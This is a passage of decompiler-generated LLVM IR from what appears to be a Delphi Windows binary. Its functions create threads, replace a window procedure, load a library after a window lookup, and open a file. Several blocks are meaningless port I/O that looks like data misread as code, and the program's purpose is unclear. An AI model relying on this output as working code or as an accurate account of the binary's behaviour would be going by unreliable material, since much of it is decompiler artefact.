  %123 = call i32 @function_405d28(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1632
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1633
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1633
  br label %dec_label_pc_406b29, !insn.addr !1633

dec_label_pc_406a61:                              ; preds = %dec_label_pc_4068af
  %124 = call i32 @function_4034f4(), !insn.addr !1634
  %125 = icmp slt i32 %124, 5, !insn.addr !1635
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1635
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1635
  br i1 %125, label %dec_label_pc_406b29, label %dec_label_pc_406a72, !insn.addr !1635

dec_label_pc_406a72:                              ; preds = %dec_label_pc_406a61
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1636
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1636
  store i32 ptrtoint ([5 x i8]* @global_var_406bb4 to i32), i32* %127, align 4, !insn.addr !1636
  %128 = call i32 @function_405078(), !insn.addr !1637
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1638
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1638
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1639
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1639
  store i32 ptrtoint ([7 x i8]* @global_var_406bc4 to i32), i32* %132, align 4, !insn.addr !1639
  %133 = call i32 @function_405078(), !insn.addr !1640
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1641
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1642
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1643
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1643
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1644
  %140 = call i32 @function_406648(), !insn.addr !1645
  %141 = call i32 @function_4051d0(), !insn.addr !1646
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1647
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1647
  br label %dec_label_pc_406b29, !insn.addr !1647

dec_label_pc_406acf:                              ; preds = %dec_label_pc_4068af
  %142 = call i32 @function_4034f4(), !insn.addr !1648
  %143 = icmp slt i32 %142, 5, !insn.addr !1649
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1649
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1649
  br i1 %143, label %dec_label_pc_406b29, label %dec_label_pc_406adc, !insn.addr !1649

dec_label_pc_406adc:                              ; preds = %dec_label_pc_406acf
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1650
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1650
  store i32 ptrtoint ([5 x i8]* @global_var_406bb4 to i32), i32* %145, align 4, !insn.addr !1650
  %146 = call i32 @function_405078(), !insn.addr !1651
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1652
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1652
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1653
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1653
  store i32 ptrtoint ([7 x i8]* @global_var_406bc4 to i32), i32* %150, align 4, !insn.addr !1653
  %151 = call i32 @function_405078(), !insn.addr !1654
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1655
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1656
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1657
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1657
  %157 = call i32 @function_406648(), !insn.addr !1658
  %158 = call i32 @function_4051d0(), !insn.addr !1659
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1659
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1659
  br label %dec_label_pc_406b29, !insn.addr !1659

dec_label_pc_406b29:                              ; preds = %dec_label_pc_4068af, %dec_label_pc_406adc, %dec_label_pc_406acf, %dec_label_pc_406a72, %dec_label_pc_406a61, %dec_label_pc_406932, %dec_label_pc_406921
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1660
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1660
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1661
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1662
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1663
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1663
  store i32 4221771, i32* %163, align 4, !insn.addr !1663
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1664
  ret i32 %164, !insn.addr !1665
}

define i32 @function_406b44() local_unnamed_addr {
dec_label_pc_406b44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1666
  ret i32 %0, !insn.addr !1666
}

define i32 @function_406b49() local_unnamed_addr {
dec_label_pc_406b49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1667
}

define i32 @function_406b4b(i32 %arg1) local_unnamed_addr {
dec_label_pc_406b4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1668
}

define i32 @function_406b77() local_unnamed_addr {
dec_label_pc_406b77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1669
}

define i32 @function_406b7f() local_unnamed_addr {
dec_label_pc_406b7f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1670
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1670
  store i32 %1, i32* %2, align 4, !insn.addr !1670
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1671
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1671
  %7 = add i8 %4, %6, !insn.addr !1671
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1671
  store i8 %7, i8* %8, align 1, !insn.addr !1671
  %9 = load i8, i8* %3, align 4, !insn.addr !1672
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1672
  %12 = trunc i32 %11 to i8, !insn.addr !1672
  %13 = add i8 %9, %12, !insn.addr !1672
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1672
  store i8 %13, i8* %14, align 1, !insn.addr !1672
  %15 = load i32, i32* %eax, align 4, !insn.addr !1673
  ret i32 %15, !insn.addr !1673
}

define i32 @function_406b86() local_unnamed_addr {
dec_label_pc_406b86:
  %0 = call i32 @function_406bc4(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1674
  ret i32 %0, !insn.addr !1674
}

define i32 @function_406bc2() local_unnamed_addr {
dec_label_pc_406bc2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1675
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1675
  store i8 %2, i8* %3, align 1, !insn.addr !1675
  ret i32 %0, !insn.addr !1675
}

define i32 @function_406bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_406bc4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_406c28, label %dec_label_pc_406bc7, !insn.addr !1676

dec_label_pc_406bc7:                              ; preds = %dec_label_pc_406bc4
  %5 = icmp eq i1 %4, false, !insn.addr !1677
  br i1 %5, label %dec_label_pc_406c3c, label %dec_label_pc_406bc9, !insn.addr !1677

dec_label_pc_406bc9:                              ; preds = %dec_label_pc_406bc7
  ret i32 %2, !insn.addr !1678

dec_label_pc_406c28:                              ; preds = %dec_label_pc_406bc4
  %6 = call i32 @function_4045d8(), !insn.addr !1679
  br label %dec_label_pc_406c3c, !insn.addr !1680

dec_label_pc_406c3c:                              ; preds = %dec_label_pc_406c28, %dec_label_pc_406bc7
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1681
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 0, i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1682
  %9 = add i32 %0, 20, !insn.addr !1683
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1683
  %11 = load i32, i32* %10, align 4, !insn.addr !1683
  %12 = add i32 %0, 16, !insn.addr !1684
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1684
  %14 = load i32, i32* %13, align 4, !insn.addr !1684
  %15 = add i32 %0, 8, !insn.addr !1685
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1685
  %17 = load i32, i32* %16, align 4, !insn.addr !1685
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1686
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1686
  ret i32 %19, !insn.addr !1687
}

define i32 @function_406c74() local_unnamed_addr {
dec_label_pc_406c74:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1688
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1688
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221944 to i32*), i32 -4, i32 %3), !insn.addr !1689
  ret i32 %4, !insn.addr !1690
}

define i32 @function_406ca9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406ca9:
  %merge.reg2mem = alloca i32, !insn.addr !1691
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1691
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1691
  store i8 %3, i8* %4, align 1, !insn.addr !1691
  %5 = add i32 %1, 114, !insn.addr !1692
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1692
  %7 = load i8, i8* %6, align 1, !insn.addr !1692
  %8 = udiv i32 %0, 256, !insn.addr !1692
  %9 = trunc i32 %8 to i8, !insn.addr !1692
  %10 = add i8 %7, %9, !insn.addr !1692
  store i8 %10, i8* %6, align 1, !insn.addr !1692
  %11 = add i8 %2, -32, !insn.addr !1693
  %12 = icmp ult i8 %2, 32, !insn.addr !1693
  %13 = icmp eq i8 %11, 0, !insn.addr !1693
  %14 = zext i8 %11 to i32, !insn.addr !1693
  %15 = and i32 %1, -256, !insn.addr !1693
  %16 = or i32 %15, %14, !insn.addr !1693
  %17 = or i1 %12, %13, !insn.addr !1694
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1694
  br i1 %17, label %dec_label_pc_406cb2, label %dec_label_pc_406d21, !insn.addr !1694

dec_label_pc_406cb2:                              ; preds = %dec_label_pc_406ca9
  %18 = add i32 %16, 105, !insn.addr !1695
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1695
  %20 = load i8, i8* %19, align 1, !insn.addr !1695
  %21 = and i8 %20, %9, !insn.addr !1695
  store i8 %21, i8* %19, align 1, !insn.addr !1695
  %22 = trunc i32 %arg3 to i16, !insn.addr !1696
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1696
  %24 = load i8, i8* %23, align 1, !insn.addr !1696
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1696
  %25 = add i32 %arg5, 105, !insn.addr !1697
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1697
  %28 = load i8, i8* %27, align 1, !insn.addr !1697
  %29 = udiv i32 %arg2, 256, !insn.addr !1697
  %30 = trunc i32 %29 to i8, !insn.addr !1697
  %31 = and i8 %28, %30, !insn.addr !1697
  store i8 %31, i8* %27, align 1, !insn.addr !1697
  %32 = mul i32 %arg5, 2, !insn.addr !1698
  %33 = add i32 %arg2, 115, !insn.addr !1698
  %34 = add i32 %33, %32, !insn.addr !1698
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1698
  %36 = load i8, i8* %35, align 1, !insn.addr !1698
  %37 = trunc i32 %arg2 to i8, !insn.addr !1698
  %38 = add i8 %36, %37, !insn.addr !1698
  %39 = icmp eq i8 %38, 0, !insn.addr !1698
  store i8 %38, i8* %35, align 1, !insn.addr !1698
  br i1 %39, label %dec_label_pc_406d03, label %dec_label_pc_406cc1, !insn.addr !1699

dec_label_pc_406cc1:                              ; preds = %dec_label_pc_406cb2
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1700
  %41 = load i32, i32* %40, align 4, !insn.addr !1700
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1700
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1701
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1701
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1701
  %45 = icmp eq i32* %43, null, !insn.addr !1702
  %46 = icmp eq i1 %45, false, !insn.addr !1703
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1703
  br i1 %46, label %dec_label_pc_406d21, label %dec_label_pc_406ce5, !insn.addr !1703

dec_label_pc_406ce5:                              ; preds = %dec_label_pc_406cc1
  %47 = call i32 @function_406c74(), !insn.addr !1704
  %48 = call i32 @function_4036f4(), !insn.addr !1705
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1706
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1707
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1707
  ret i32 %51, !insn.addr !1708

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cb2
  %52 = call i32 @__asm_insd(i16 %22), !insn.addr !1709
  %53 = inttoptr i32 %arg7 to i32*, !insn.addr !1709
  store i32 %52, i32* %53, align 4, !insn.addr !1709
  %54 = call i32 @__asm_in.50(i16 %22), !insn.addr !1710
  %55 = and i32 %54, 255, !insn.addr !1711
  %56 = add i32 %55, %arg4, !insn.addr !1711
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1711
  %58 = load i8, i8* %57, align 1, !insn.addr !1711
  %59 = zext i8 %58 to i32, !insn.addr !1711
  %60 = and i32 %54, -256, !insn.addr !1711
  %61 = or i32 %60, %59, !insn.addr !1711
  ret i32 %61, !insn.addr !1711

dec_label_pc_406d21:                              ; preds = %dec_label_pc_406cc1, %dec_label_pc_406ca9
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1711
}

define i32 @function_406dc9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406dc9:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1712
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1712
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1712
  %9 = add i8 %6, %8, !insn.addr !1712
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1712
  store i8 %9, i8* %10, align 1, !insn.addr !1712
  %11 = load i32, i32* %eax, align 4, !insn.addr !1713
  %12 = add i32 %11, 114, !insn.addr !1713
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1713
  %14 = load i8, i8* %13, align 1, !insn.addr !1713
  %15 = udiv i32 %2, 256, !insn.addr !1713
  %16 = trunc i32 %15 to i8, !insn.addr !1713
  %17 = add i8 %14, %16, !insn.addr !1713
  store i8 %17, i8* %13, align 1, !insn.addr !1713
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1714
  %20 = add i8 %19, -32, !insn.addr !1714
  %21 = icmp ult i8 %19, 32, !insn.addr !1714
  %22 = icmp eq i8 %20, 0, !insn.addr !1714
  %23 = zext i8 %20 to i32, !insn.addr !1714
  %24 = and i32 %18, -256, !insn.addr !1714
  %25 = or i32 %24, %23, !insn.addr !1714
  store i32 %25, i32* %eax, align 4, !insn.addr !1714
  %26 = or i1 %21, %22, !insn.addr !1715
  br i1 %26, label %dec_label_pc_406dd2, label %dec_label_pc_406e41, !insn.addr !1715

dec_label_pc_406dd2:                              ; preds = %dec_label_pc_406dc9
  %27 = add i32 %25, 105, !insn.addr !1716
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1716
  %29 = load i8, i8* %28, align 1, !insn.addr !1716
  %30 = and i8 %29, %16, !insn.addr !1716
  store i8 %30, i8* %28, align 1, !insn.addr !1716
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1717
  store i32 %31, i32* %eax, align 4, !insn.addr !1717
  %32 = trunc i32 %arg3 to i16, !insn.addr !1718
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1718
  %34 = load i8, i8* %33, align 1, !insn.addr !1718
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1718
  %35 = add i32 %arg5, 105, !insn.addr !1719
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1719
  %38 = load i8, i8* %37, align 1, !insn.addr !1719
  %39 = udiv i32 %arg2, 256, !insn.addr !1719
  %40 = trunc i32 %39 to i8, !insn.addr !1719
  %41 = and i8 %38, %40, !insn.addr !1719
  store i8 %41, i8* %37, align 1, !insn.addr !1719
  %42 = mul i32 %arg5, 2, !insn.addr !1720
  %43 = add i32 %arg2, 115, !insn.addr !1720
  %44 = add i32 %43, %42, !insn.addr !1720
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1720
  %46 = load i8, i8* %45, align 1, !insn.addr !1720
  %47 = trunc i32 %arg2 to i8, !insn.addr !1720
  %48 = add i8 %46, %47, !insn.addr !1720
  %49 = icmp eq i8 %48, 0, !insn.addr !1720
  store i8 %48, i8* %45, align 1, !insn.addr !1720
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1721
  br i1 %49, label %dec_label_pc_406e23, label %dec_label_pc_406de1, !insn.addr !1721

dec_label_pc_406de1:                              ; preds = %dec_label_pc_406dd2
  %50 = icmp slt i8 %48, 0, !insn.addr !1720
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1722
  %52 = load i32, i32* %51, align 4, !insn.addr !1722
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1722
  br i1 %50, label %dec_label_pc_406e58, label %dec_label_pc_406de6, !insn.addr !1723

dec_label_pc_406de6:                              ; preds = %dec_label_pc_406de1
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1724
  %55 = add i8 %54, -32, !insn.addr !1724
  %56 = icmp ult i8 %54, 32, !insn.addr !1724
  %57 = icmp eq i8 %55, 0, !insn.addr !1724
  %58 = zext i8 %55 to i32, !insn.addr !1724
  %59 = and i32 %53, -256, !insn.addr !1724
  %60 = or i32 %59, %58, !insn.addr !1724
  store i32 %60, i32* %eax, align 4, !insn.addr !1724
  %61 = or i1 %56, %57, !insn.addr !1725
  br i1 %61, label %dec_label_pc_406dea, label %dec_label_pc_406e59, !insn.addr !1725

dec_label_pc_406dea:                              ; preds = %dec_label_pc_406de6
  %62 = add i32 %arg2, 105, !insn.addr !1726
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1726
  %64 = load i8, i8* %63, align 1, !insn.addr !1726
  %65 = udiv i32 %53, 256, !insn.addr !1726
  %66 = trunc i32 %65 to i8, !insn.addr !1726
  %67 = and i8 %64, %66, !insn.addr !1726
  store i8 %67, i8* %63, align 1, !insn.addr !1726
  %68 = add i32 %arg6, 105, !insn.addr !1727
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1727
  %70 = load i8, i8* %69, align 1, !insn.addr !1727
  %71 = and i8 %70, %40, !insn.addr !1727
  store i8 %71, i8* %69, align 1, !insn.addr !1727
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1728
  %74 = load i8, i8* %73, align 1, !insn.addr !1728
  %75 = trunc i32 %72 to i8, !insn.addr !1728
  %76 = add i8 %74, %75, !insn.addr !1728
  store i8 %76, i8* %73, align 1, !insn.addr !1728
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1729
  %79 = load i8, i8* %78, align 1, !insn.addr !1729
  %80 = trunc i32 %77 to i8, !insn.addr !1729
  %81 = add i8 %79, %80, !insn.addr !1729
  store i8 %81, i8* %78, align 1, !insn.addr !1729
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1730
  %83 = load i32, i32* %82, align 4, !insn.addr !1730
  %84 = add i32 %83, %arg6, !insn.addr !1730
  store i32 %84, i32* %82, align 4, !insn.addr !1730
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1731
  %87 = load i8, i8* %86, align 1, !insn.addr !1731
  %88 = trunc i32 %85 to i8, !insn.addr !1731
  %89 = add i8 %87, %88, !insn.addr !1731
  store i8 %89, i8* %86, align 1, !insn.addr !1731
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1732
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1733
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1733
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1733
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1734
  %92 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1735
  %93 = add i32 %92, 1, !insn.addr !1735
  %94 = icmp eq i32 %93, 0, !insn.addr !1735
  store i32 %93, i32* @global_var_4096e0, align 4, !insn.addr !1735
  %95 = icmp eq i1 %94, false, !insn.addr !1736
  br i1 %95, label %dec_label_pc_406e1b, label %dec_label_pc_406e11, !insn.addr !1736

dec_label_pc_406e11:                              ; preds = %dec_label_pc_406dea
  %96 = call i32 @"@LStrClr"(), !insn.addr !1737
  br label %dec_label_pc_406e1b, !insn.addr !1737

dec_label_pc_406e1b:                              ; preds = %dec_label_pc_406e11, %dec_label_pc_406dea
  store i32 0, i32* %eax, align 4, !insn.addr !1738
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1739
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1740
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1740
  br label %dec_label_pc_406e23, !insn.addr !1740

dec_label_pc_406e23:                              ; preds = %dec_label_pc_406e1b, %dec_label_pc_406dd2
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1741
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1741
  store i32 4222512, i32* %99, align 4, !insn.addr !1741
  %100 = load i32, i32* %eax, align 4, !insn.addr !1742
  ret i32 %100, !insn.addr !1742

dec_label_pc_406e41:                              ; preds = %dec_label_pc_406dc9
  %101 = mul i32 %4, 2, !insn.addr !1743
  %102 = add i32 %1, 105, !insn.addr !1743
  %103 = add i32 %102, %101, !insn.addr !1743
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1743
  %105 = load i32, i32* %104, align 4, !insn.addr !1743
  %106 = or i32 %105, %3, !insn.addr !1743
  store i32 %106, i32* %104, align 4, !insn.addr !1743
  %107 = add i32 %0, -1, !insn.addr !1744
  %108 = trunc i32 %3 to i16, !insn.addr !1745
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1745
  %110 = load i32, i32* %109, align 4, !insn.addr !1745
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1745
  %111 = load i32, i32* %eax, align 4, !insn.addr !1746
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1746
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1746
  %115 = or i8 %112, %114, !insn.addr !1746
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1746
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1747
  %118 = load i8, i8* %117, align 1, !insn.addr !1747
  %119 = trunc i32 %116 to i8, !insn.addr !1747
  %120 = add i8 %118, %119, !insn.addr !1747
  store i8 %120, i8* %117, align 1, !insn.addr !1747
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1748
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1748
  %124 = load i8, i8* %123, align 1, !insn.addr !1748
  %125 = add i8 %124, %122, !insn.addr !1748
  %126 = zext i8 %125 to i32, !insn.addr !1748
  %127 = and i32 %121, -256, !insn.addr !1748
  %128 = or i32 %127, %126, !insn.addr !1748
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1749
  %130 = load i8, i8* %129, align 1, !insn.addr !1749
  %131 = trunc i32 %3 to i8, !insn.addr !1750
  %132 = add i8 %125, %131, !insn.addr !1749
  %133 = add i8 %132, %130, !insn.addr !1750
  store i8 %133, i8* %129, align 1, !insn.addr !1750
  %134 = add i32 %128, 1, !insn.addr !1751
  store i32 %134, i32* %eax, align 4, !insn.addr !1751
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1752
  %136 = load i8, i8* %135, align 1, !insn.addr !1752
  %137 = trunc i32 %134 to i8, !insn.addr !1752
  %138 = add i8 %136, %137, !insn.addr !1752
  store i8 %138, i8* %135, align 1, !insn.addr !1752
  br label %dec_label_pc_406e58, !insn.addr !1752

dec_label_pc_406e58:                              ; preds = %dec_label_pc_406e41, %dec_label_pc_406de1
  %139 = load i32, i32* %eax, align 4, !insn.addr !1752
  ret i32 %139, !insn.addr !1752

dec_label_pc_406e59:                              ; preds = %dec_label_pc_406de6
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1753
  %141 = load i8, i8* %140, align 1, !insn.addr !1753
  %142 = add i8 %141, %55, !insn.addr !1753
  store i8 %142, i8* %140, align 1, !insn.addr !1753
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1754
  %145 = load i8, i8* %144, align 1, !insn.addr !1754
  %146 = trunc i32 %arg3 to i8, !insn.addr !1754
  %147 = add i8 %145, %146, !insn.addr !1754
  store i8 %147, i8* %144, align 1, !insn.addr !1754
  %148 = load i32, i32* %eax, align 4, !insn.addr !1755
  %149 = add i32 %148, 1, !insn.addr !1755
  %150 = mul i32 %149, 2, !insn.addr !1756
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1756
  %152 = load i8, i8* %151, align 2, !insn.addr !1756
  %153 = trunc i32 %149 to i8, !insn.addr !1756
  %154 = add i8 %152, %153, !insn.addr !1756
  store i8 %154, i8* %151, align 2, !insn.addr !1756
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1757
  %156 = load i8, i8* %155, align 1, !insn.addr !1757
  %157 = add i8 %156, %153, !insn.addr !1757
  store i8 %157, i8* %155, align 1, !insn.addr !1757
  ret i32 %149, !insn.addr !1758
}

define i32 @function_406e84() local_unnamed_addr {
dec_label_pc_406e84:
  %esp.1.reg2mem = alloca i32, !insn.addr !1759
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1760
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1760
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1760
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1761
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1762
  %3 = call i32 @function_4036f4(), !insn.addr !1763
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1764
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1764
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1764
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1765
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1766
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1767
  br i1 %7, label %dec_label_pc_407023, label %dec_label_pc_406eee, !insn.addr !1767

dec_label_pc_406eee:                              ; preds = %dec_label_pc_406e84
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1765
